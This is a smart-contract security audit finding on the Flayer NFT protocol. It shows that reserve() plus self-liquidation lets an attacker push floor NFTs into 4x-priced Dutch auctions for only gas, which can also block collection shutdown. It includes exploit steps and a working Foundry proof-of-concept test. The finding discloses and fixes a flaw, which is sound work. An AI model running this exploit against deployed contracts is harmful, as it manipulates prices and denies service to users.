# Lockbox listings can be self-liquidated for Free, allowing all floor deposits to be placed into Liquidation Dutch Listings.

## Summary
The `reserve()` function in `Listings.sol` can be called for free for **floor NFTs** deposited into `Locker.sol`. This allows someone to list all of the NFTs deposited into `Locker.sol` via `deposit()` for **floor value** and place them in an **infarable position** that will soon liquidate, leading to **Dutch auctions** starting with very unrealistic prices, as liquidation **Dutch auctions** start with a **4x floorMultiplier**.

This can also happen without using `reserve()`, as one can call `redeem()` in `Locker.sol`. Then go to ProtectedListings and create a protected listing with the max borrow amount, and then self-liquidate.

## Vulnerability Detail
This issue arises because our `max borrow amount` [0.95] + `keep reward` [0.05] equals the value of the NFT = 1 CT or 1 floor price. 

The reserve operation is essentially a quick way to do it. It "buys/redeems" the floor priced NFT and then creates a LockBox/ProtectedListing. 
The minimum collateral for reserve() is `0.05e18`, because for a LockBox, the maximum borrowable amount is `0.95e18`, defined by the `MAX_PROTECTED_TOKEN_AMOUNT` constant in ProtectedListings, validated [here](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L230).

```solidity
        createProtectedListing[0] = IProtectedListings.CreateListing({
            collection: _collection,
            tokenIds: tokenIds,
            listing: IProtectedListings.ProtectedListing({
                owner: payable(address(this)),
@>>             tokenTaken: uint96(1 ether - _collateral),
                checkpoint: 0 // Set in the `createListings` call
            })
        });
```
So we can essentially recover those `0.05 CT` from the `KEEPER_REWARD`.

### Exploit Process:
1. A bad actor calls `reserve()` and deposits **0.05e18** collateral to create a listing, since collateral is the minimum the listing is **very close to liquidation**.
2. The bad actor submits another transaction, calling `liquidateProtectedListing()`, which is possible as the position is now unhealthy due to the compound fees applied even with just **1 second delay**.
3. The bad actor earns the **KEEPER_REWARD**, which is **0.05e18** and is paid immediately. This means they effectively pay **only gas fees**, which are low on the **Base L2**, where the protocol is deployed.
4. The bad actor can repeat this process in **chunks** by submitting only **2 transactions** but reserving all the NFTs deposited in `Locker.sol` and listing them as liquidation listings.

### Coded PoC
Add this to Listings.t.sol and use `forge test --match-test test_VectorFreeLiqudationListing -vvvv`
```solidity
    function test_VectorFreeLiqudationListing() public {
        //===========Setup===========
        listings.setProtectedListings(address(protectedListings));
        ICollectionToken token = locker.collectionToken(address(erc721a));
        assertEq(token.denomination(), 0);

        address randomNFTOwner = address(0x77);
        uint _tokenId = 2555;
        erc721a.mint(randomNFTOwner, _tokenId);

        address maliciousActor = address(0x78);
        deal(address(token), maliciousActor, 1 ether);

        // Balance Delta tracking
        uint startBalanceMaliciousActor = token.balanceOf(maliciousActor);
        assertEq(startBalanceMaliciousActor, 1 ether);
        //===========Setup===========
    
        vm.startPrank(randomNFTOwner);

        erc721a.approve(address(locker), _tokenId);
        locker.deposit(address(erc721a), _tokenIdToArray(_tokenId));
        
        vm.stopPrank();

        // Malicious actor liquidates floor listing for free.
        vm.startPrank(maliciousActor);
        
        // First reserve it.
        token.approve(address(listings), 0.05 ether);
        listings.reserve({
            _collection: address(erc721a),
            _tokenId: _tokenId,
            _collateral: 0.05 ether
        });

        // 1 second later submit another transaction
        // Note: this can be scalled by reserving multiple NFTs in the first transaction and liquidating them in the second one.
        skip(1);

        // Liquidate the listing
        protectedListings.liquidateProtectedListing(address(erc721a), _tokenId);

        // Assert no loss of funds for the malicious actor
        assertEq(token.balanceOf(maliciousActor), startBalanceMaliciousActor);

        // Skip 5 days to bring the liquidation listing to lower floor multiple again.
        skip(5 days);

        //Repeat the process, but now reserve the liquidation listing. ( we have to use different address, but this is not a problem)
        address maliciousActor2 = address(0x79);
        deal(address(token), maliciousActor2, 1 ether);
        
        vm.startPrank(maliciousActor2);

        token.approve(address(listings), 0.05 ether);
        listings.reserve({
            _collection: address(erc721a),
            _tokenId: _tokenId,
            _collateral: 0.05 ether
        });

        skip(1);

        protectedListings.liquidateProtectedListing(address(erc721a), _tokenId);
       //Bad actor did not lose any balance
        assertEq(token.balanceOf(maliciousActor2), 1 ether);
    }
```    
## Impact

The potential consequences are as follows:
1. **CollectionShutdown** requires 4 CT in totalSupply and no Protected, Liquid, or Dutch listings running. If an NFT is deposited in `Locker.sol`, a bad actor can essentially **DoS the shutdown**. The only way to rescue the shutdown would be for someone to **buy it with their CT**, but there's **no incentive** to do this, as the CT can be used later to claim rewards from NFTs sold on sudoswap.
2. **Floor-priced NFTs** are valued at the floor for a reason. If this operation can be done **for free**, the process can be **repeated indefinitely**. After 4 days of high prices, the bad actor can repeat the process at no cost, keeping floor NFTs artificially **expensive** ( up to 4x floor price ):
```solidity
        _listings.createLiquidationListing(
            IListings.CreateListing({
                collection: _collection,
                tokenIds: tokenIds,
                listing: IListings.Listing({
                    owner: listing.owner,
                    created: uint40(block.timestamp),
@>>                 duration: 4 days,
@>>                 floorMultiple: 400
                })
            })
        );
```        

## Tool Used

**Manual Review**

## Recommendation
To avoid this problem, reduce the max borrow amount from `0.95 CT` to a lower value, like `0.9 CT`, or even lower. 
Then it will not be possible to do this operation for free.
